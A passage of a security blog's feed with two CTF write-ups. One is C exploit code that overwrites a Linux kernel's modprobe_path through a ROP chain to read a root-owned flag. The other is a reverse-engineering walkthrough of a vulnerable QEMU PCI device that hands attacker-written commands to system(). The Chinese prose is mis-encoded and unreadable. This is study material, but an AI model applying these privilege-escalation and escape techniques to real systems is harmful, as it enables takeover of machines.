class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">u64 kernel_base              = <span class=\"number\">0xffffffff81000000</span>;</span><br><span class=\"line\">u64 kpti_trampoline          = <span class=\"number\">0x200f10</span>+<span class=\"number\">22</span>;</span><br><span class=\"line\">u64 modprobe                 = <span class=\"number\">0x1061820</span>;</span><br><span class=\"line\">u64 mov_ptr_rbx_rax_pop2_ret = <span class=\"number\">0x306d</span>;</span><br><span class=\"line\">u64 pop_rbx_pop2_ret         = <span class=\"number\">0x3190</span>;</span><br><span class=\"line\">u64 pop_rax_ret              = <span class=\"number\">0x4d11</span>; <span class=\"comment\">// pop rax; ret</span></span><br><span class=\"line\">u64 tmp_rax;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">print_leak</span><span class=\"params\">(u64 *p, u64 n)</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">for</span>(u64 i = <span class=\"number\">0</span>; i &lt; n; i++)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(p[i] &amp; <span class=\"number\">0xffffffff81000000</span> == <span class=\"number\">0xffffffff81000000</span>)</span><br><span class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;p[%d] : 0x%lx\\n&quot;</span>, i, p[i]);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">leak</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;leak&quot;</span>);</span><br><span class=\"line\">  <span class=\"type\">char</span> store[<span class=\"number\">0x300</span>];</span><br><span class=\"line\">  rfk(store,<span class=\"number\">0x1f0</span>);</span><br><span class=\"line\">  u64 *ptr = store;</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;   --&gt; canary is 0x%lx&quot;</span>, ptr[<span class=\"number\">2</span>]);</span><br><span class=\"line\">  canary = ptr[<span class=\"number\">2</span>];</span><br><span class=\"line\">  kernel_base = ptr[<span class=\"number\">38</span>] - <span class=\"number\">0xa157</span>;</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;   --&gt; kernel_base is 0x%lx&quot;</span>,kernel_base);</span><br><span class=\"line\">  modprobe                    += kernel_base;</span><br><span class=\"line\">  mov_ptr_rbx_rax_pop2_ret    += kernel_base;</span><br><span class=\"line\">  pop_rbx_pop2_ret            += kernel_base;</span><br><span class=\"line\">  kpti_trampoline             += kernel_base;</span><br><span class=\"line\">  pop_rax_ret                 += kernel_base;</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;leak&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">trigger_modprobe</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;trigger_modprobe&quot;</span>);</span><br><span class=\"line\">  system(</span><br><span class=\"line\">    <span class=\"string\">&quot;echo &#x27;#!/bin/sh\\n&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;cp /flag /tmp/flag\\n&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;chmod 777 /tmp/flag&#x27; &gt; /tmp/s\\n&quot;</span></span><br><span class=\"line\">  );</span><br><span class=\"line\">  system(<span class=\"string\">&quot;chmod +x /tmp/s&quot;</span>);</span><br><span class=\"line\">  system(<span class=\"string\">&quot;echo -ne &#x27;\\\\xff\\\\xff\\\\xff\\\\xff&#x27; &gt; /tmp/dummy&quot;</span>);</span><br><span class=\"line\">  system(<span class=\"string\">&quot;chmod +x /tmp/dummy&quot;</span>);</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;Run unknown file&quot;</span>);</span><br><span class=\"line\">  system(<span class=\"string\">&quot;/tmp/dummy&quot;</span>);</span><br><span class=\"line\">  system(<span class=\"string\">&quot;cat /tmp/flag&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">overflow</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  u64 payload[<span class=\"number\">0x40</span>];</span><br><span class=\"line\">  u64 off = <span class=\"number\">16</span>;</span><br><span class=\"line\">  payload[off++] = canary;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// rbx</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// r12</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// rbp</span></span><br><span class=\"line\">  payload[off++] = pop_rbx_pop2_ret;</span><br><span class=\"line\">  payload[off++] = modprobe;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>; <span class=\"comment\">// dummy</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>; <span class=\"comment\">// dummy</span></span><br><span class=\"line\">  payload[off++] = pop_rax_ret; </span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0x732f706d742f</span>;<span class=\"comment\">// /tmp/s little-endian</span></span><br><span class=\"line\">  payload[off++] = mov_ptr_rbx_rax_pop2_ret;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  payload[off++] = kpti_trampoline;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// dummy rax</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// dummy rdi</span></span><br><span class=\"line\">  payload[off++] = trigger_modprobe;</span><br><span class=\"line\">  payload[off++] = user_cs;</span><br><span class=\"line\">  payload[off++] = user_rflags;</span><br><span class=\"line\">  payload[off++] = user_sp;</span><br><span class=\"line\">  payload[off++] = user_ss;</span><br><span class=\"line\">  wtk(payload, off * <span class=\"number\">8</span>);</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;read_from_addr_primitive&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  saveState();</span><br><span class=\"line\">  open_dev();</span><br><span class=\"line\">  leak();</span><br><span class=\"line\">  overflow();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"references\"><a class=\"markdownIt-Anchor\" href=\"#references\">#</a> references</h1>\n<p><a href=\"https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/\">Learning Linux Kernel Exploitation - Part 1 - Midas Blog</a><br>\n<a href=\"https://blog.csdn.net/weixin_46483787/article/details/124199102\">2020 hxpctf kernel-rop_Ayakaaaa çš„åšå®¢ - CSDN åšå®¢</a><br>\n<a href=\"https://ctf-wiki.org/pwn/linux/kernel-mode/defense/randomization/fgkaslr/\"> FGKASLR - CTF Wiki</a></p>\n",
            "tags": [
                "Linux",
                "Kernel state"
            ]
        },
        {
            "id": "https://squirre17.github.io/2022/09/16/a-easy-virtualization-challenge/",
            "url": "https://squirre17.github.io/2022/09/16/a-easy-virtualization-challenge/",
            "title": "a-easy-virtualization-challenge",
            "date_published": "2022-09-16T02:43:40.000Z",
            "content_html": "<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">sub_5713A8</span><span class=\"params\">(__int64 a1)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 result; <span class=\"comment\">// rax</span></span><br><span class=\"line\"></span><br><span class=\"line\">  result = sub_70031D(a1, <span class=\"string\">&quot;pci-device&quot;</span>, <span class=\"string\">&quot;/home/wang/qemu/hw/misc/myrfid.c&quot;</span>, <span class=\"number\">369LL</span>, <span class=\"string\">&quot;rfid_class_init&quot;</span>);</span><br><span class=\"line\">  *(_QWORD *)(result + <span class=\"number\">176</span>) = qxl_reset_handler;</span><br><span class=\"line\">  *(_QWORD *)(result + <span class=\"number\">184</span>) = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  *(_WORD *)(result + <span class=\"number\">208</span>) = <span class=\"number\">0x420</span>;          [<span class=\"number\">1</span>] &lt;&lt;- vendor_id</span><br><span class=\"line\">  *(_WORD *)(result + <span class=\"number\">210</span>) = <span class=\"number\">0x1337</span>;         [<span class=\"number\">2</span>] &lt;&lt;- device_id</span><br><span class=\"line\">  *(_BYTE *)(result + <span class=\"number\">212</span>) = <span class=\"number\">0x69</span>;</span><br><span class=\"line\">  *(_WORD *)(result + <span class=\"number\">214</span>) = <span class=\"number\">0xFF</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>è¿™ä¸ªå’Œæºç å¯¹åº”å…³ç³»å¦‚ä¸‹</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">qxl_pci_class_init</span><span class=\"params\">(ObjectClass *klass, <span class=\"type\">void</span> *data)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    DeviceClass *dc = DEVICE_CLASS(klass);</span><br><span class=\"line\">    PCIDeviceClass *k = PCI_DEVICE_CLASS(klass);</span><br><span class=\"line\"></span><br><span class=\"line\">    k-&gt;vendor_id = REDHAT_PCI_VENDOR_ID;</span><br><span class=\"line\">    k-&gt;device_id = QXL_DEVICE_ID_STABLE;</span><br><span class=\"line\">    set_bit(DEVICE_CATEGORY_DISPLAY, dc-&gt;categories);</span><br><span class=\"line\">    dc-&gt;reset = qxl_reset_handler;</span><br><span class=\"line\">    dc-&gt;vmsd = &amp;qxl_vmstate;</span><br><span class=\"line\">    device_class_set_props(dc, qxl_properties);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>å‡­å€Ÿç€å‚å•† id å’Œè®¾å¤‡ id å°±èƒ½æ‰¾åˆ°æ€»çº¿ä¸Šçš„ä½ç½®<br>\nç™»å…¥è¿›å»çœ‹åˆ°æ€»çº¿</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">lspci -nvv</span></span><br><span class=\"line\">00:00.0 Class 0600: 8086:1237</span><br><span class=\"line\">00:01.3 Class 0680: 8086:7113</span><br><span class=\"line\">00:03.0 Class 0200: 8086:100e</span><br><span class=\"line\">00:01.1 Class 0101: 8086:7010</span><br><span class=\"line\">00:02.0 Class 0300: 1234:1111</span><br><span class=\"line\">00:01.0 Class 0601: 8086:7000</span><br><span class=\"line\">00:04.0 Class 00ff: 0420:1337                 [1] &lt;&lt;- æ˜¯è¿™ä¸ªb</span><br></pre></td></tr></table></figure>\n<p>ç„¶åå¯ä»¥çœ‹åˆ°å†…å­˜ä¸­çš„ä½ç½®âœ¨TODO</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\"># cat /sys/devices/pci0000\\:00/0000:00:04.0/resource</span></span><br><span class=\"line\"><span class=\"number\">0x00000000fb000000</span> <span class=\"number\">0x00000000fbffffff</span> <span class=\"number\">0x0000000000040200</span></span><br><span class=\"line\"><span class=\"number\">0x0000000000000000</span> <span class=\"number\">0x0000000000000000</span> <span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x0000000000000000</span> <span class=\"number\">0x0000000000000000</span> <span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x0000000000000000</span> <span class=\"number\">0x0000000000000000</span> <span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x0000000000000000</span> <span class=\"number\">0x0000000000000000</span> <span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\">èµ·å§‹åœ°å€            ç»ˆæ­¢åœ°å€             é•¿åº¦</span><br></pre></td></tr></table></figure>\n<p>æ³¨æ„<br>\n source æ˜¯ç»™ç”¨æˆ·çœ‹çš„ è€Œ resource0~10 ä¹‹ç±»çš„æ˜¯ç»™æˆ‘ä»¬ open çš„<br>\n source å°±æ˜¯æ•´åˆäº†è¿™äº›çš„è¡¨æ ¼</p>\n<p>ä» handler è·Ÿä¸‹å»<br>\nå‘ç°æœ‰ä¸€å¤„è°ƒç”¨äº†å‡½æ•°æ•°ç»„</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> __int64 __fastcall <span class=\"title function_\">sub_571043</span><span class=\"params\">(__int64 a1, __int64 a2)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v3; <span class=\"comment\">// [rsp+38h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v3 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  sub_570742(*(_QWORD *)(a1 + <span class=\"number\">120</span>), <span class=\"number\">1LL</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !(<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)sub_5C950D(a1, <span class=\"number\">0LL</span>, <span class=\"number\">1LL</span>, <span class=\"number\">1LL</span>, <span class=\"number\">0LL</span>, a2) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    sub_570635(a1 + <span class=\"number\">2688</span>, <span class=\"number\">1LL</span>, sub_570A2E, a1);</span><br><span class=\"line\">    sub_843CE1(a1 + <span class=\"number\">2520</span>);</span><br><span class=\"line\">    sub_843FBD(a1 + <span class=\"number\">2576</span>);</span><br><span class=\"line\">    sub_8449B4(a1 + <span class=\"number\">2512</span>, <span class=\"string\">&quot;rfid&quot;</span>, sub_570E7C, a1, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">    sub_31B892(a1 + <span class=\"number\">2272</span>, a1, func_array, a1, <span class=\"string\">&quot;rfid-mmio&quot;</span>, &amp;off_1000000);  [<span class=\"number\">1</span>] &lt;&lt;- vuln</span><br><span class=\"line\">    <span class=\"title function_\">sub_5C1EF2</span><span class=\"params\">(a1, <span class=\"number\">0LL</span>, <span class=\"number\">0LL</span>, a1 + <span class=\"number\">2272</span>)</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v3;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>å‡½æ•°æ•°ç»„å¦‚ä¸‹</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000F</span>E9720 func_array      dq offset vuln          ; DATA XREF: qxl_reset_handler+<span class=\"number\">111</span>â†‘o</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000F</span>E9728                 dq offset sub_570CEB</span><br></pre></td></tr></table></figure>\n<p>å…¶å®è¿™å°±æ˜¯ä¸ª op è¡¨ é‡Œé¢æ”¾çš„æ˜¯ read write ä¹‹ç±»çš„<br>\næºç å¦‚ä¸‹</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">const</span> MemoryRegionOps qxl_io_ops = &#123;</span><br><span class=\"line\">    .read = ioport_read,</span><br><span class=\"line\">    .write = ioport_write,</span><br><span class=\"line\">    .valid = &#123;</span><br><span class=\"line\">        .min_access_size = <span class=\"number\">1</span>,</span><br><span class=\"line\">        .max_access_size = <span class=\"number\">1</span>,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>ç»ˆäºæ¥åˆ°äº†æ¼æ´å‡½æ•°<br>\nåªè¦è®©è¿™ä¸ªå˜é‡ å’Œä»–å¯¹åº”çš„ç§˜ç±ç›¸åŒå³å¯</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">vuln</span><span class=\"params\">(__int64 a1, <span class=\"type\">unsigned</span> __int64 a2)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">size_t</span> v2; <span class=\"comment\">// rax</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( ((a2 &gt;&gt; <span class=\"number\">20</span>) &amp; <span class=\"number\">0xF</span>) != <span class=\"number\">15</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v2 = <span class=\"built_in\">strlen</span>(cheats);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !<span class=\"built_in\">memcmp</span>(byte_122FFE0, cheats, v2) )</span><br><span class=\"line\">      system(command);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">270438LL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>æ ¹æ®è¿™ä¸ªå˜é‡å¯ä»¥å¾€ä¸Š xref</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_BYTE *__fastcall <span class=\"title function_\">mmio_write</span><span class=\"params\">(__int64 a1, <span class=\"type\">unsigned</span> __int64 dst, __int64 src, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> num)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  _BYTE *result; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  _DWORD n[<span class=\"number\">3</span>]; <span class=\"comment\">// [rsp+4h] [rbp-3Ch] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v6; <span class=\"comment\">// [rsp+10h] [rbp-30h]</span></span><br><span class=\"line\">  __int64 v7; <span class=\"comment\">// [rsp+18h] [rbp-28h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v8; <span class=\"comment\">// [rsp+2Ch] [rbp-14h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> idx; <span class=\"comment\">// [rsp+30h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v10; <span class=\"comment\">// [rsp+34h] [rbp-Ch]</span></span><br><span class=\"line\">  __int64 v11; <span class=\"comment\">// [rsp+38h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v7 = a1;</span><br><span class=\"line\">  v6 = dst;</span><br><span class=\"line\">  *(_QWORD *)&amp;n[<span class=\"number\">1</span>] = src;</span><br><span class=\"line\">  v11 = a1;</span><br><span class=\"line\">  v8 = (dst &gt;&gt; <span class=\"number\">20</span>) &amp; <span class=\"number\">0xF</span>;</span><br><span class=\"line\">  idx = (dst &gt;&gt; <span class=\"number\">16</span>) &amp; <span class=\"number\">0xF</span>;</span><br><span class=\"line\">  result = (_BYTE *)((dst &gt;&gt; <span class=\"number\">20</span>) &amp; <span class=\"number\">0xF</span>);</span><br><span class=\"line\">  <span class=\"keyword\">switch</span> ( (<span class=\"type\">unsigned</span> __int64)result )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">0uLL</span>:</span><br><span class=\"line\">      result = byteArray;</span><br><span class=\"line\">      byteArray[idx] = <span class=\"string\">&#x27;w&#x27;</span>;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">1uLL</span>:</span><br><span class=\"line\">      result = byteArray;</span><br><span class=\"line\">      byteArray[idx] = <span class=\"string\">&#x27;s&#x27;</span>;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">2uLL</span>:</span><br><span class=\"line\">      result = byteArray;</span><br><span class=\"line\">      byteArray[idx] = <span class=\"string\">&#x27;a&#x27;</span>;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">3uLL</span>:</span><br><span class=\"line\">      result = byteArray;</span><br><span class=\"line\">      byteArray[idx] = <span class=\"string\">&#x27;d&#x27;</span>;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">4uLL</span>:</span><br><span class=\"line\">      result = byteArray;</span><br><span class=\"line\">      byteArray[idx] = <span class=\"string\">&#x27;A&#x27;</span>;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">5uLL</span>:</span><br><span class=\"line\">      result = byteArray;</span><br><span class=\"line\">      byteArray[idx] = <span class=\"string\">&#x27;B&#x27;</span>;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">6uLL</span>:</span><br><span class=\"line\">      v10 = (<span class=\"type\">unsigned</span> __int16)v6;</span><br><span class=\"line\">      result = <span class=\"built_in\">memcpy</span>(&amp;command[(<span class=\"type\">unsigned</span> __int16)v6], &amp;n[<span class=\"number\">1</span>], num);</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">default</span>:</span><br><span class=\"line\">      <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>è¿™æ­£æ˜¯å‡½æ•°æ•°ç»„çš„ç¬¬äºŒä¸ªæˆå‘˜</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000F</span>E9720 func_array      dq offset mmio_read     ; DATA XREF: qxl_reset_handler+<span class=\"number\">111</span>â†‘o</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000F</span>E9728                 dq offset mmio_write</span><br></pre></td></tr></table></figure>\n<p>æˆ‘ä»¬åªéœ€è¦å¾€ cmd é‡Œå†™å…¥å‘½ä»¤<br>\nç„¶åå†™å…¥ç§˜ç±<br>\n read çš„æ—¶å€™å°±èƒ½å‘½ä»¤æ‰§è¡Œäº†</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span 